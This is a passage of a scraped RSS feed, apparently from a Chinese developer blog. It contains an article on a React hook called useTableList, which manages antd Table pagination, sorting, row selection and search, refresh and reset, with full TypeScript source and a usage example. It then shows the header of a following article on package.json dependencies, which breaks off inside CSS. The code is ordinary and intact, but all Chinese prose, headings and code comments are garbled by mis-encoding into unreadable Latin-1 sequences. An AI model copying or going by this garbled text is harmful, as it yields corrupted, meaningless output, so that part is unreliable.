<li>åˆ†é¡µ / é¡µç åŒæ­¥</li>
<li>æŸ¥è¯¢å‚æ•°åˆå¹¶</li>
<li>è¡¨æ ¼æ’åºæ˜ å°„</li>
<li>rowSelection ç®¡ç†</li>
<li>search / refresh / reset è¡Œä¸ºåŒºåˆ†</li>
</ul>
<p>ç»“æœå°±æ˜¯ï¼š</p>
<p>ğŸ‘‰ æ¯ä¸ªåˆ—è¡¨é¡µå‡ ä¹éƒ½åœ¨å¤åˆ¶ç²˜è´´ï¼Œè€Œä¸” bug ç‰¹åˆ«å®¹æ˜“é›†ä¸­åœ¨è¿™äº›åœ°æ–¹ã€‚</p>
<p>æ‰€ä»¥æˆ‘ç»™è‡ªå·±å®šäº†ä¸€ä¸ªç›®æ ‡ï¼š</p>
<blockquote>
<p>åˆ—è¡¨é¡µåªå…³å¿ƒï¼šè¡¨å• + columns + ä¸šåŠ¡æ“ä½œ<br/>
å…¶ä½™å…¨éƒ¨äº¤ç»™ Hookã€‚</p>
</blockquote>
<hr/>
<h2 data-id="heading-1">äºŒã€è®¾è®¡ç›®æ ‡</h2>
<ul>
<li>âœ… æ•°æ®è¯·æ±‚æ”¶æ•›åˆ°ä¸€ä¸ªå…¥å£</li>
<li>âœ… è¡¨æ ¼è¡Œä¸ºï¼ˆåˆ†é¡µ / æ’åºï¼‰å†…èš</li>
<li>âœ… å¯¹å¤–æš´éœ²è¯­ä¹‰æ¸…æ™°çš„ API</li>
<li>âœ… æœ€å¤§é™åº¦è´´åˆ antd Table</li>
<li>âœ… å¯ä½œä¸ºé¡¹ç›®çº§åŸºç¡€è®¾æ–½</li>
</ul>
<hr/>
<h2 data-id="heading-2">ä¸‰ã€å¯¹å¤– API è®¾è®¡</h2>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">const</span> {
  queryParams,
  search,
  refresh,
  reset,
  selectedRowKeys,
  tableProps
} = <span class="hljs-title function_">useTableList</span>(getListApi, { <span class="hljs-attr">rowSelection</span>: <span class="hljs-literal">true</span> })
</code></pre>
<h3 data-id="heading-3">search â€”â€” æŸ¥è¯¢ï¼ˆå›åˆ°ç¬¬ä¸€é¡µï¼‰</h3>
<p>ç”¨äºè¡¨å•æœç´¢ / æ¡ä»¶å˜åŒ–ã€‚</p>
<h3 data-id="heading-4">refresh â€”â€” åˆ·æ–°å½“å‰é¡µ</h3>
<p>ç”¨äºæ–°å¢ / åˆ é™¤ / ä¿®æ”¹ä¹‹åã€‚</p>
<h3 data-id="heading-5">reset â€”â€” é‡ç½®æ¡ä»¶</h3>
<p>ç”¨äºé‡ç½®æŒ‰é’®ã€‚</p>
<h3 data-id="heading-6">selectedRowKeys â€”â€” æ‰¹é‡æ“ä½œèƒ½åŠ›åŸºç¡€</h3>
<h3 data-id="heading-7">tableProps â€”â€” ç›´æ¥ä¼ ç»™ antd Table</h3>
<pre><code class="hljs language-tsx" lang="tsx">&lt;<span class="hljs-title class_">Table</span> rowKey=<span class="hljs-string">"id"</span> columns={columns} {...tableProps} /&gt;
</code></pre>
<hr/>
<h2 data-id="heading-8">å››ã€å…¨å±€é…ç½®èƒ½åŠ›</h2>
<p>è§£å†³ä¸åŒåç«¯å­—æ®µä¸ç»Ÿä¸€çš„é—®é¢˜ï¼š</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-title function_">configureTableOption</span>({
  <span class="hljs-attr">pageSize</span>: <span class="hljs-number">20</span>,
  <span class="hljs-attr">sortField</span>: [<span class="hljs-string">'orderType'</span>, <span class="hljs-string">'orderField'</span>],
  <span class="hljs-attr">sortOrder</span>: [<span class="hljs-string">'ASC'</span>, <span class="hljs-string">'DESC'</span>]
})
</code></pre>
<hr/>
<h2 data-id="heading-9">äº”ã€æ ¸å¿ƒå®ç°æ€è·¯</h2>
<h3 data-id="heading-10">1ï¸âƒ£ å•ä¸€æ•°æ®å…¥å£</h3>
<p>æ‰€æœ‰è¡Œä¸ºæœ€ç»ˆéƒ½ä¼šèµ°ï¼š</p>
<ul>
<li>search</li>
<li>refresh</li>
<li>reset</li>
<li>è¡¨æ ¼åˆ†é¡µ / æ’åº</li>
</ul>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">const</span> <span class="hljs-title function_">fetchList</span> = <span class="hljs-keyword">async</span> (<span class="hljs-params">params</span>) =&gt; { ... }
</code></pre>
<p>è¿™æ˜¯æ•´ä¸ª Hook ç¨³å®šæ€§çš„æ ¸å¿ƒã€‚</p>
<hr/>
<h3 data-id="heading-11">2ï¸âƒ£ æŸ¥è¯¢å‚æ•°æ˜¯å”¯ä¸€çœŸç›¸</h3>
<p>åˆ†é¡µã€æ’åºã€æ¡ä»¶éƒ½æ”¶æ•›åœ¨ queryParams ä¸­ï¼Œé¿å…çŠ¶æ€å‰²è£‚ã€‚</p>
<hr/>
<h3 data-id="heading-12">3ï¸âƒ£ è¡¨æ ¼è¡Œä¸ºå®Œå…¨å†…èš</h3>
<pre><code class="hljs language-ts" lang="ts">onTableChange =&gt; <span class="hljs-title function_">fetchList</span>()
</code></pre>
<p>é¡µé¢å±‚ä¸å†å¤„ç†åˆ†é¡µ / æ’åºç»†èŠ‚ã€‚</p>
<hr/>
<h3 data-id="heading-13">4ï¸âƒ£ rowSelection ç»Ÿä¸€æ‰˜ç®¡</h3>
<p>è®©æ‰¹é‡æ“ä½œå¤©ç„¶å¯æ‰©å±•ã€‚</p>
<hr/>
<h2 data-id="heading-14">å…­ã€å®Œæ•´æºç ï¼ˆuseTableList.tsï¼‰</h2>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">import</span> {  <span class="hljs-keyword">type</span> <span class="hljs-title class_">Key</span>, <span class="hljs-keyword">type</span> <span class="hljs-title class_">ReactNode</span>, useState, useEffect, useCallback, useRef, useMemo } <span class="hljs-keyword">from</span> <span class="hljs-string">'react'</span>
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">Empty</span>, <span class="hljs-keyword">type</span> <span class="hljs-title class_">TableProps</span> <span class="hljs-keyword">as</span> <span class="hljs-title class_">AntdTableProps</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'antd'</span>
<span class="hljs-keyword">import</span> <span class="hljs-keyword">type</span> {
  <span class="hljs-title class_">TablePaginationConfig</span>,
  <span class="hljs-title class_">TableCurrentDataSource</span>
} <span class="hljs-keyword">from</span> <span class="hljs-string">'antd/es/table/interface'</span>

<span class="hljs-keyword">export</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">QueryParamsData</span> {
  <span class="hljs-attr">pageNo</span>: <span class="hljs-built_in">number</span>
  <span class="hljs-attr">pageSize</span>: <span class="hljs-built_in">number</span>
  orderType?: <span class="hljs-built_in">string</span>
  orderField?: <span class="hljs-built_in">string</span>
  [<span class="hljs-attr">key</span>: <span class="hljs-built_in">string</span>]: <span class="hljs-built_in">any</span>
}

<span class="hljs-keyword">interface</span> <span class="hljs-title class_">TableResponse</span>&lt;T&gt; {
  <span class="hljs-attr">status</span>: <span class="hljs-built_in">string</span>
  <span class="hljs-attr">data</span>: {
    <span class="hljs-attr">list</span>: T[]
    <span class="hljs-attr">totalCount</span>: <span class="hljs-built_in">number</span>
  }
}

<span class="hljs-keyword">interface</span> <span class="hljs-title class_">TableState</span>&lt;T&gt; {
  <span class="hljs-attr">pagination</span>: <span class="hljs-title class_">TablePaginationConfig</span>
  <span class="hljs-attr">list</span>: T[]
  <span class="hljs-attr">queryParams</span>: <span class="hljs-title class_">QueryParamsData</span>
}

<span class="hljs-keyword">export</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">TableProps</span>&lt;T&gt; {
  <span class="hljs-attr">bordered</span>: <span class="hljs-built_in">boolean</span>
  <span class="hljs-attr">size</span>: <span class="hljs-string">'middle'</span>
  <span class="hljs-attr">sticky</span>: <span class="hljs-built_in">boolean</span>
  <span class="hljs-attr">rowSelection</span>: <span class="hljs-title class_">AntdTableProps</span>&lt;T&gt;[<span class="hljs-string">'rowSelection'</span>] | <span class="hljs-literal">undefined</span>
  <span class="hljs-attr">pagination</span>: <span class="hljs-title class_">TablePaginationConfig</span>
  <span class="hljs-attr">loading</span>: <span class="hljs-built_in">boolean</span>
  <span class="hljs-attr">dataSource</span>: T[]
  <span class="hljs-attr">onChange</span>: <span class="hljs-title class_">AntdTableProps</span>&lt;T&gt;[<span class="hljs-string">'onChange'</span>]
  <span class="hljs-attr">locale</span>: {
    <span class="hljs-attr">emptyText</span>: <span class="hljs-built_in">string</span> | <span class="hljs-title class_">ReactNode</span>
  }
}

<span class="hljs-keyword">interface</span> <span class="hljs-title class_">TableListResult</span>&lt;T&gt; {
  <span class="hljs-comment">/** æŸ¥è¯¢å‚æ•° */</span>
  <span class="hljs-attr">queryParams</span>: <span class="hljs-title class_">QueryParamsData</span>
  <span class="hljs-comment">/** æ‰§è¡ŒæŸ¥è¯¢æ–¹æ³• */</span>
  <span class="hljs-attr">search</span>: <span class="hljs-function">(<span class="hljs-params">params?: Record&lt;<span class="hljs-built_in">string</span>, <span class="hljs-built_in">any</span>&gt;</span>) =&gt;</span> <span class="hljs-built_in">void</span>
  <span class="hljs-attr">refresh</span>: <span class="hljs-function">(<span class="hljs-params">params?: Record&lt;<span class="hljs-built_in">string</span>, <span class="hljs-built_in">any</span>&gt;</span>) =&gt;</span> <span class="hljs-built_in">void</span>
  <span class="hljs-attr">reset</span>: <span class="hljs-function">(<span class="hljs-params">params?: Record&lt;<span class="hljs-built_in">string</span>, <span class="hljs-built_in">any</span>&gt;</span>) =&gt;</span> <span class="hljs-built_in">void</span>
  <span class="hljs-comment">/** é€‰ä¸­çš„è¡Œ keys */</span>
  <span class="hljs-attr">selectedRowKeys</span>: <span class="hljs-title class_">Key</span>[]
  <span class="hljs-comment">/** è¡¨æ ¼å±æ€§ */</span>
  <span class="hljs-attr">tableProps</span>: <span class="hljs-title class_">TableProps</span>&lt;T&gt;
}

<span class="hljs-keyword">interface</span> <span class="hljs-title class_">GlobalTableConfig</span> {
  <span class="hljs-attr">sortField</span>: <span class="hljs-built_in">string</span>[]
  <span class="hljs-attr">sortOrder</span>: <span class="hljs-built_in">string</span>[]
  <span class="hljs-attr">pageSize</span>: <span class="hljs-built_in">number</span>
}

<span class="hljs-comment">// é»˜è®¤é…ç½®</span>
<span class="hljs-keyword">const</span> <span class="hljs-attr">globalTableConfig</span>: <span class="hljs-title class_">GlobalTableConfig</span> = {
  <span class="hljs-attr">sortField</span>: [<span class="hljs-string">'orderType'</span>, <span class="hljs-string">'orderField'</span>],
  <span class="hljs-attr">sortOrder</span>: [<span class="hljs-string">'ASC'</span>, <span class="hljs-string">'DESC'</span>],
  <span class="hljs-attr">pageSize</span>: <span class="hljs-number">10</span>
}

<span class="hljs-comment">/**
 * é…ç½®å…¨å±€è¡¨æ ¼å‚æ•°
 * <span class="hljs-doctag">@param</span> <span class="hljs-variable">config</span>
 */</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">configureTableOption</span>(<span class="hljs-params">config: GlobalTableConfig</span>): <span class="hljs-built_in">void</span> {
  <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">keys</span>(config).<span class="hljs-title function_">forEach</span>(<span class="hljs-function">(<span class="hljs-params">key: <span class="hljs-built_in">string</span></span>) =&gt;</span> {
    globalTableConfig[key] = config[key]
  })
}

<span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> useTableList&lt;T <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Record</span>&lt;<span class="hljs-built_in">string</span>, <span class="hljs-built_in">any</span>&gt; = <span class="hljs-title class_">Record</span>&lt;<span class="hljs-built_in">string</span>, <span class="hljs-built_in">any</span>&gt;&gt;(
  <span class="hljs-attr">getRequestFn</span>: <span class="hljs-function">(<span class="hljs-params">data: QueryParamsData</span>) =&gt;</span> <span class="hljs-title class_">Promise</span>&lt;<span class="hljs-title class_">TableResponse</span>&lt;T&gt;&gt;,
  initParams = {} <span class="hljs-keyword">as</span> <span class="hljs-title class_">Record</span>&lt;<span class="hljs-built_in">string</span>, <span class="hljs-built_in">any</span>&gt;
): <span class="hljs-title class_">TableListResult</span>&lt;T&gt; {
  <span class="hljs-keyword">const</span> { rowSelection, ...restInitParams } = initParams
  <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">PAGE_SIZE</span> = globalTableConfig.<span class="hljs-property">pageSize</span>

  <span class="hljs-keyword">const</span> [state, setState] = useState&lt;<span class="hljs-title class_">TableState</span>&lt;T&gt;&gt;({
    <span class="hljs-attr">pagination</span>: {
      <span class="hljs-attr">showSizeChanger</span>: <span class="hljs-literal">true</span>,
      <span class="hljs-attr">showQuickJumper</span>: <span class="hljs-literal">true</span>,
      <span class="hljs-attr">total</span>: <span class="hljs-number">0</span>,
      <span class="hljs-attr">pageSize</span>: <span class="hljs-variable constant_">PAGE_SIZE</span>,
      <span class="hljs-attr">current</span>: <span class="hljs-number">1</span>
    },
    <span class="hljs-attr">list</span>: [],
    <span class="hljs-attr">queryParams</span>: {
      <span class="hljs-attr">pageNo</span>: <span class="hljs-number">1</span>,
      <span class="hljs-attr">pageSize</span>: <span class="hljs-variable constant_">PAGE_SIZE</span>,
      ...restInitParams
    }
  })

  <span class="hljs-keyword">const</span> { pagination, list, queryParams } = state
  <span class="hljs-keyword">const</span> { <span class="hljs-attr">pageNo</span>: currentPageNo, <span class="hljs-attr">pageSize</span>: currentPageSize } = queryParams

  <span class="hljs-keyword">const</span> [isLoading, setIsLoading] = <span class="hljs-title function_">useState</span>(<span class="hljs-literal">true</span>)
  <span class="hljs-keyword">const</span> initialQuery = <span class="hljs-title function_">useRef</span>(queryParams)
  <span class="hljs-keyword">const</span> [selectedRowKeys, setSelectedRowKeys] = useState&lt;<span class="hljs-title class_">Key</span>[]&gt;([])


  <span class="hljs-keyword">const</span> <span class="hljs-attr">rowSelectionData</span>: <span class="hljs-title class_">AntdTableProps</span>&lt;T&gt;[<span class="hljs-string">'rowSelection'</span>] | <span class="hljs-literal">undefined</span> = <span class="hljs-title function_">useMemo</span>(<span class="hljs-function">() =&gt;</span> {
    <span class="hljs-keyword">if</span> (!rowSelection) <span class="hljs-keyword">return</span> <span class="hljs-built_in">void</span> <span class="hljs-number">0</span>
    <span class="hljs-keyword">return</span> {
      selectedRowKeys,
      <span class="hljs-attr">onChange</span>: <span class="hljs-function">(<span class="hljs-params">keys: Key[]</span>) =&gt;</span> <span class="hljs-title function_">setSelectedRowKeys</span>(keys)
    }
  }, [rowSelection, selectedRowKeys])

  <span class="hljs-keyword">const</span> showTotal = <span class="hljs-title function_">useCallback</span>(
    (<span class="hljs-attr">total</span>: <span class="hljs-built_in">number</span>): <span class="hljs-function"><span class="hljs-params">string</span> =&gt;</span> {
      <span class="hljs-keyword">return</span> <span class="hljs-string">`å…± <span class="hljs-subst">${total}</span> æ¡è®°å½• ç¬¬ <span class="hljs-subst">${currentPageNo}</span>/<span class="hljs-subst">${<span class="hljs-built_in">Math</span>.ceil(total / currentPageSize)}</span> é¡µ `</span>
    },
    [currentPageNo, currentPageSize]
  )

  <span class="hljs-keyword">const</span> fetchList = <span class="hljs-title function_">useCallback</span>(
    <span class="hljs-keyword">async</span> (<span class="hljs-attr">params</span>: <span class="hljs-title class_">QueryParamsData</span>): <span class="hljs-title class_">Promise</span>&lt;<span class="hljs-built_in">void</span>&gt; =&gt; {
      <span class="hljs-keyword">const</span> { pageNo } = params
      <span class="hljs-title function_">setIsLoading</span>(<span class="hljs-literal">true</span>)
      <span class="hljs-keyword">const</span> queryParamsData = { ...restInitParams, <span class="hljs-attr">pageSize</span>: currentPageSize, ...params }
      <span class="hljs-keyword">if</span> (params.<span class="hljs-property">pageNo</span> === <span class="hljs-built_in">void</span> <span class="hljs-number">0</span>) {
        queryParamsData.<span class="hljs-property">pageNo</span> = <span class="hljs-number">1</span>
      }
      <span class="hljs-keyword">if</span> (params.<span class="hljs-property">pageSize</span> === <span class="hljs-built_in">void</span> <span class="hljs-number">0</span>) {
        queryParamsData.<span class="hljs-property">pageSize</span> = currentPageSize
      }
      <span class="hljs-keyword">const</span> { data } = <span class="hljs-keyword">await</span> <span class="hljs-title function_">getRequestFn</span>(queryParamsData)
      <span class="hljs-keyword">const</span> { list = [], totalCount = <span class="hljs-number">0</span> } = data || {}
      rowSelection &amp;&amp; <span class="hljs-title function_">setSelectedRowKeys</span>([])
      <span class="hljs-title function_">setState</span>({
        list,
        <span class="hljs-attr">queryParams</span>: queryParamsData <span class="hljs-keyword">as</span> T &amp; <span class="hljs-title class_">QueryParamsData</span>,
        <span class="hljs-attr">pagination</span>: {
          ...pagination,
          <span class="hljs-attr">current</span>: pageNo,
          <span class="hljs-attr">pageSize</span>: queryParamsData.<span class="hljs-property">pageSize</span>,
          <span class="hljs-attr">total</span>: totalCount
        }
      })

      <span class="hljs-title function_">setIsLoading</span>(<span class="hljs-literal">false</span>)
    },
    [queryParams, restInitParams, rowSelection, currentPageSize, getRequestFn, pagination]
  )

  <span class="hljs-keyword">const</span> search = <span class="hljs-title function_">useCallback</span>(
    <span class="hljs-function">(<span class="hljs-params">params?: Record&lt;<span class="hljs-built_in">string</span>, <span class="hljs-built_in">any</span>&gt;</span>) =&gt;</span> {
      <span class="hljs-title function_">fetchList</span>({ ...queryParams, ...params, <span class="hljs-attr">pageNo</span>: <span class="hljs-number">1</span> })
    },
    [fetchList, queryParams]
  )

  <span class="hljs-keyword">const</span> refresh = <span class="hljs-title function_">useCallback</span>(
    <span class="hljs-function">(<span class="hljs-params">params?: Record&lt;<span class="hljs-built_in">string</span>, <span class="hljs-built_in">any</span>&gt;</span>) =&gt;</span> {
      <span class="hljs-title function_">fetchList</span>({ ...queryParams, ...params})
    },
    [fetchList, queryParams]
  )

  <span class="hljs-keyword">const</span> reset = <span class="hljs-title function_">useCallback</span>(
    <span class="hljs-function">(<span class="hljs-params">params?: Record&lt;<span class="hljs-built_in">string</span>, <span class="hljs-built_in">any</span>&gt;</span>) =&gt;</span> {
      <span class="hljs-title function_">fetchList</span>({ ...params, <span class="hljs-attr">pageSize</span>: currentPageSize, <span class="hljs-attr">pageNo</span>: <span class="hljs-number">1</span> })
    },
    [fetchList, currentPageSize]
  )

  <span class="hljs-keyword">const</span> onTableChange = <span class="hljs-title function_">useCallback</span>(
    <span class="hljs-function">(<span class="hljs-params"> pagination: TablePaginationConfig,
      _filters: Record&lt;<span class="hljs-built_in">string</span>, <span class="hljs-built_in">any</span>&gt;,
      sorter: Record&lt;<span class="hljs-built_in">string</span>, <span class="hljs-built_in">any</span>&gt;,
      extra: TableCurrentDataSource&lt;<span class="hljs-built_in">any</span>&gt;</span>) =&gt;</span> {
      <span class="hljs-keyword">const</span> { action } = extra
      <span class="hljs-keyword">if</span> ([<span class="hljs-string">'paginate'</span>, <span class="hljs-string">'sort'</span>].<span class="hljs-title function_">includes</span>(action)) {
        <span class="hljs-keyword">const</span> { current, pageSize } = pagination
        <span class="hljs-keyword">const</span> { field, order } = sorter
        <span class="hljs-keyword">const</span> [orderTypeField, orderFieldName] = globalTableConfig.<span class="hljs-property">sortField</span>
        <span class="hljs-keyword">const</span> [ascValue, descValue] = globalTableConfig.<span class="hljs-property">sortOrder</span>
        <span class="hljs-keyword">const</span> params = {
          ...queryParams,
          [orderTypeField]: order ? (order === <span class="hljs-string">'ascend'</span> ? ascValue : descValue) : <span class="hljs-built_in">void</span> <span class="hljs-number">0</span>,
          [orderFieldName]: field,
          <span class="hljs-attr">pageNo</span>: current,
          <span class="hljs-attr">pageSize</span>: pageSize
        }
        <span class="hljs-title function_">fetchList</span>(params)
      }
    },
    [queryParams, fetchList]
  )

  <span class="hljs-keyword">const</span> <span class="hljs-attr">tableProps</span>: <span class="hljs-title class_">TableProps</span>&lt;T&gt; = <span class="hljs-title function_">useMemo</span>(<span class="hljs-function">() =&gt;</span> {
    <span class="hljs-keyword">return</span> {
      <span class="hljs-attr">bordered</span>: <span class="hljs-literal">true</span>,
      <span class="hljs-attr">size</span>: <span class="hljs-string">'middle'</span>,
      <span class="hljs-attr">sticky</span>: <span class="hljs-literal">true</span>,
      <span class="hljs-attr">rowSelection</span>: rowSelectionData,
      <span class="hljs-attr">pagination</span>: { ...pagination, showTotal },
      <span class="hljs-attr">loading</span>: isLoading,
      <span class="hljs-attr">dataSource</span>: list,
      <span class="hljs-attr">onChange</span>: onTableChange,
      <span class="hljs-attr">locale</span>: {
        <span class="hljs-attr">emptyText</span>: isLoading ? <span class="hljs-string">''</span> : <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">Empty</span> <span class="hljs-attr">image</span>=<span class="hljs-string">{Empty.PRESENTED_IMAGE_SIMPLE}</span> /&gt;</span></span>
      }
    }
  }, [rowSelectionData, pagination, showTotal, isLoading, list, onTableChange])

  <span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> {
    <span class="hljs-title function_">search</span>(initialQuery.<span class="hljs-property">current</span>)
  }, [])

  <span class="hljs-keyword">return</span> {
    queryParams,
    search,
    refresh,
    reset,
    selectedRowKeys,
    tableProps
  }
}

</code></pre>
<hr/>
<h2 data-id="heading-15">ä¸ƒã€é¡µé¢ä½¿ç”¨ç¤ºä¾‹</h2>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">const</span> { tableProps, search, reset, selectedRowKeys } = <span class="hljs-title function_">useTableList</span>(getUserList, {
  <span class="hljs-attr">rowSelection</span>: <span class="hljs-literal">true</span>
})
</code></pre>
<pre><code class="hljs language-tsx" lang="tsx">&lt;<span class="hljs-title class_">Form</span> onFinish={search}&gt;
  <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">Button</span> <span class="hljs-attr">htmlType</span>=<span class="hljs-string">"submit"</span>&gt;</span>æœç´¢<span class="hljs-tag">&lt;/<span class="hljs-name">Button</span>&gt;</span></span>
  <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">Button</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">{reset}</span>&gt;</span>é‡ç½®<span class="hljs-tag">&lt;/<span class="hljs-name">Button</span>&gt;</span></span>
&lt;/<span class="hljs-title class_">Form</span>&gt;

<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">Table</span> <span class="hljs-attr">rowKey</span>=<span class="hljs-string">"id"</span> <span class="hljs-attr">columns</span>=<span class="hljs-string">{columns}</span> {<span class="hljs-attr">...tableProps</span>} /&gt;</span></span>
</code></pre>
<hr/>
<h2 data-id="heading-16">å…«ã€æ€»ç»“</h2>
<p>useTableList å¸¦æ¥çš„ä¸æ˜¯â€œå°‘å†™å‡ è¡Œä»£ç â€ï¼Œè€Œæ˜¯ï¼š</p>
<ul>
<li>åˆ—è¡¨é¡µå·¥ç¨‹åŒ–</li>
<li>è¡Œä¸ºæ¨¡å‹ç»Ÿä¸€</li>
<li>Bug é›†ä¸­æ”¶å£</li>
<li>å¯æŒç»­æ‰©å±•</li>
</ul>
<p>éå¸¸é€‚åˆä½œä¸ºä¸­åå°é¡¹ç›®çš„åŸºç¡€è®¾æ–½ã€‚</p>
<hr/>
<h2 data-id="heading-17">ä¹ã€åç»­å¯è¿›é˜¶æ–¹å‘</h2>
<ul>
<li>URL åŒæ­¥æŸ¥è¯¢å‚æ•°</li>
<li>å¯¼å‡º / æ‰¹é‡æ“ä½œèƒ½åŠ›</li>
<li>è‡ªåŠ¨è½®è¯¢ / ç¼“å­˜</li>
<li>å‘ ProTable å½¢æ€æ¼”è¿›</li>
</ul>
<hr/>
<p>å¦‚æœè¿™ç¯‡æ–‡ç« å¯¹ä½ æœ‰å¸®åŠ©ï¼Œæ¬¢è¿ç‚¹èµ / æ”¶è— / è¯„è®ºäº¤æµ ğŸ‘
ä¹Ÿæ¬¢è¿åˆ†äº«ä½ ä»¬é¡¹ç›®ä¸­æ˜¯å¦‚ä½•å°è£…åˆ—è¡¨é¡µçš„ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[package.json ä¸­çš„ dependencies ä¸ devDependenciesï¼šæ·±åº¦è§£æ]]></title>    <link>https://juejin.cn/post/7592615536384966690</link>    <guid>https://juejin.cn/post/7592615536384966690</guid>    <pubDate>2026-01-08T09:42:46.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592615536384966690" data-draft-id="7592787377656283170" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="package.json ä¸­çš„ dependencies ä¸ devDependenciesï¼šæ·±åº¦è§£æ"/> <meta itemprop="keywords" content="å‰ç«¯,å‰ç«¯æ¡†æ¶,è®¾è®¡æ¨¡å¼"/> <meta itemprop="datePublished" content="2026-01-08T09:42:46.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å¤§çŸ¥é—²é—²i"/> <meta itemprop="url" content="https://juejin.cn/user/3799545205237111"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            package.json ä¸­çš„ dependencies ä¸ devDependenciesï¼šæ·±åº¦è§£æ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3799545205237111/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å¤§çŸ¥é—²é—²i
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-08T09:42:46.000Z" title="Thu Jan 08 2026 09:42:46 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»1åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid 